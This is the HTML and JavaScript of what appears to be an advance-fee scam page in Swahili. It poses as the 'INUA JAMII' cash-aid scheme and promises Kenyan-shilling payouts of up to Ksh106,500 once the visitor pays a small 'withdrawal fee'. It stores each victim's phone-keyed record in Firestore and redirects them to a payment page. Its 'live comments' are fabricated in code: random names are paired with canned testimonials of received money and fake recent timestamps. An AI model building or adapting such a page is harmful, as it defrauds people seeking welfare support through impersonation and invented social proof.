<!DOCTYPE html>
<html lang="sw">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>INUA JAMII ‚Äì Kiasi</title>
  <link rel="stylesheet" href="style.css" />

  <!-- Firebase -->
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
  <script src="firebase-config.js"></script>
</head>
<body>

<div class="container">

  <!-- Ujumbe wa tahadhari katikati (nyekundu) -->
  <div id="alertMessage" style="
    display: none;
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background-color: #ff4d4d; /* rangi nyekundu */
    color: white; /* rangi ya maandishi */
    padding: 10px 20px;
    border-radius: 8px;
    font-size: 16px;
    z-index: 10000;
    box-shadow: 0 4px 8px rgba(0,0,0,0.2);
  "></div>

  <p style="font-size:20px; font-weight:bold;">
    Hongera üëè <span id="username"></span>.
  </p>

  <p>
    Una uwezo wa kupokea FEDHA KUTOKA INUA JAMII. Huu ni MCHAKATO YA FEDHA ZA INUA JAMII.
    ‚¨áÔ∏è‚¨áÔ∏è‚¨áÔ∏è
  </p>

  <ul style="font-size:18px; line-height:1.8;">
    <li>1. Ksh12,300 ‚Äî ada ya utoaji ni <strong>Ksh99</strong></li>
    <li>2. Ksh26,500 ‚Äî ada ya utoaji ni <strong>Ksh155</strong></li>
    <li>3. Ksh38,100 ‚Äî ada ya utoaji ni <strong>Ksh248</strong></li>
    <li>4. Ksh46,850 ‚Äî ada ya utoaji ni <strong>Ksh320</strong></li>
    <li>5. Ksh50,000 ‚Äî ada ya utoaji ni <strong>Ksh440</strong></li>
    <li>6. Ksh79,700 ‚Äî ada ya utoaji ni <strong>Ksh580</strong></li>
    <li>7. Ksh106,500 ‚Äî ada ya utoaji ni <strong>Ksh760</strong></li>
  </ul>

  <p style="margin-top:10px;">
    Huu ni mchakato wetu wa 2025‚Äì2026 wa kuunga mkono Raia wa Yanzania.
    Unatakiwa kuchagua kiasi cha pesa unayoweza kulipa kwa ada yake ya utoaji.
  </p>

  <p style="font-weight:bold;">
    KUMBUKA UTAPOKEA FEDHA ZA INUA JAMII NDANI YA dakika 3 BAADA YA KULIPA ADA YA UTOAJI.
  </p>

  <p>
    FEDHA ZA INUA JAMII zinazotolewa na
    <strong>SHIRIKA LA INUA JAMII</strong>, na <strong>SHIRIKA ZINGINE ZISIZOLENGA FAIDA</strong>
  </p>

  <hr>

  <!-- Vitufe vya kiasi -->
  <div class="fund-buttons">
    <button data-amount="12300" data-fee="99">Ksh 12,300</button>
    <button data-amount="26500" data-fee="155">Ksh 26,500</button>
    <button data-amount="38100" data-fee="248">Ksh 38,100</button>
    <button data-amount="46850" data-fee="320">Ksh 46,850</button>
    <button data-amount="50000" data-fee="440">Ksh 50,000</button>
    <button data-amount="79700" data-fee="580">Ksh 79,700</button>
    <button data-amount="106500" data-fee="760">Ksh 106,500</button>
  </div>

  <p style="font-size:20px; margin-top:15px;">
    Ada ya utoaji Uliyochagua:
    <strong>Ksh <span id="processingFee">---</span></strong>
  </p>

  <button onclick="continueToPayment()">Endelea Na Malipo</button>

  <!-- Maoni -->
  <h3 style="margin-top:30px;">Maoni ya Moja kwa Moja sasa</h3>
  <div id="commentsBox" class="comments-box"></div>

</div>

<script>
/* ================= HABARI ZA MTUMIAJI ================= */
const userPhone = localStorage.getItem("userPhone");
if (!userPhone) {
  window.location.href = "register.html";
}

let selectedFund = null;

db.collection("users").doc(userPhone).get().then(doc => {
  if (doc.exists && doc.data().fullname) {
    document.getElementById("username").innerText = doc.data().fullname;
  }
});

/* ================= UCHAGUZI WA KIASI ================= */
document.querySelectorAll(".fund-buttons button").forEach(btn => {
  btn.addEventListener("click", () => {
    selectedFund = {
      amount: btn.dataset.amount,
      fee: btn.dataset.fee
    };
    document.getElementById("processingFee").innerText = btn.dataset.fee;
  });
});

// Function ya kuonyesha onyo katikati kwa rangi nyekundu
function showAlert(message) {
  const alertDiv = document.getElementById("alertMessage");
  alertDiv.innerText = message;
  alertDiv.style.display = "block";
  setTimeout(() => {
    alertDiv.style.display = "none";
  }, 2000);
}

function continueToPayment() {
  if (!selectedFund) {
    showAlert("Tafadhali chagua kiasi kwanza.");
    return;
  }

  // Hifadhi kiasi cha pesa kwenye Firestore
  db.collection("users").doc(userPhone).update({
    selectedFund: selectedFund
  }).then(() => {
    // Pasa ada kama kiingilio cha URL 'fees2' na pia tuma offer
    const fees2 = encodeURIComponent(selectedFund.fee);
    const offer = "Hii ni ofa maalum kwa kiasi hiki!";
    // Pata na tuma offer pia
    window.location.href = "payment1.html?fees2=" + fees2 + "&offer=" + encodeURIComponent(offer);
  });
}

/* ================= MAONI NA SHUHUDA ================= */
const commentsBox = document.getElementById("commentsBox");

const names = [
  "Mary Wanjiku","James Otieno","Faith Njeri","Kevin Mwangi",
  "Brian Kiptoo","Ann Chebet","John Kamau","Lucy Atieno",
  "Peter Mutiso","Grace Akinyi","Samuel Kibet","Mercy Nyambura",
  "Daniel Ouma","Esther Jepchirchir","Joseph Maina","Susan Wairimu",
  "Victor Ochieng","Alice Muthoni","Dennis Barasa","Ruth Chelimo",
  "Paul Onyango","Nancy Wambui","Eric Rotich","Linda Auma",
  "George Kiplagat","Janet Moraa","Michael Njoroge","Brenda Akinyi",
  "Stephen Bett","Caroline Mumbi","Allan Otieno","Diana Jepkosgei",
  "Patrick Kimani","Beatrice Wanjala","Noah Kiplangat","Irene Atieno",
  "Felix Kariuki","Joyce Nyambura","Caleb Mutua","Winfred Chepkemoi"
];

const messages = [
  "Nimepokea 500k kutoka INUA JAMII! Asante üôè",
  "Nilifikiri ni uongo lakini niliombaa 250k. Nimeshukuru sana!",
  "Nimepokea 40k. Ni jukwaa halali na la kuaminika üôå",
  "Fedha zimekuja chini ya dakika 3. Ajabu!",
  "Ninajaza biashara yangu na INUA JAMII. Asante!",
  "Haraka sana na inaaminika. Nimepata 300k.",
  "Nianze biashara ndogo kwa kutumia 500k. Asante!",
  "Malipo yalikuwa rahisi, nimepokea Laki Tatu.",
  "INUA JAMII ni ya kuaminika. Nimepata 38k.",
  "Huduma nzuri, 46,850 nimepokea.",
  "Uidhinishaji wa haraka na usambazaji wa haraka wa fedha.",
  "Nilifikiri ni bandia lakini niliambaa pesa yangu.",
  "120,300 imepokea kwa mafanikio. Asante INUA JAMII!",
  "Fedha zimetumwa kwa haraka kuliko nilivyotarajia.",
  "Jukwaa halali, nimepata 50k kwenye simu yangu.",
  "Kuzidisha biashara yangu kumefanyika kwa urahisi.",
  "INUA JAMII ni halali. Nimepata 79,700.",
  "Fedha zilisaidia kulipia kodi yangu. Asante!",
  "Utoaji wa haraka, nimepokea 106,500.",
  "Nimeridhika sana na INUA JAMII.",
  "Nimepokea 380,100 kwa dakika.",
  "Nianze biashara na kupata 260,500.",
  "Fedha ni halali, haraka, na za kuaminika.",
  "Nafurahi kupokea laki sita, asante!",
  "Inua Jamii haikawahi kukatisha tamaa.",
  "Tsh 500,000 zimekuja kwa muda mfupi sana.",
  "Jukwaa ni la kuaminika. Fedha zimetumwa.",
  "Nililipa ada ya utoaji na niliombaa 200,000 mara moja.",
  "Jukwaa halali, nimefurahi sana.",
  "Nimepokea 700,000, imenisaidia kuanzisha mradi wangu."
];

function timeAgo() {
  const times = [
    "sasa hivi","sekunde 2 zilizopita","sekunde 10 zilizopita",
    "sekunde 30 zilizopita","dakika 1 zilizopita","dakika 2 zilizopita","dakika 5 zilizopita"
  ];
  return times[Math.floor(Math.random() * times.length)];
}

// Fungsi ya kuzungusha orodha
function shuffle(arr) {
  for (let i = arr.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [arr[i], arr[j]] = [arr[j], arr[i]];
  }
  return arr;
}

// Kizazi cha maoni
let comments = shuffle(names).map(name => ({
  name,
  text: messages[Math.floor(Math.random() * messages.length)],
  time: timeAgo()
}));

comments.forEach(c => {
  const div = document.createElement("div");
  div.className = "comment";
  div.innerHTML = `
    <strong>${c.name}</strong>: ${c.text}
    <br><span>alitoa maoni ${c.time}</span>
  `;
  commentsBox.appendChild(div);
});

// Kuendelea kuonyesha maoni kwa mtiririko
let scrollPos = 0;
setInterval(() => {
  scrollPos++;
  commentsBox.scrollTop = scrollPos;
  if (scrollPos >= commentsBox.scrollHeight - commentsBox.clientHeight) {
    scrollPos = 0;
  }
}, 60);
</script>

</body>
</html>
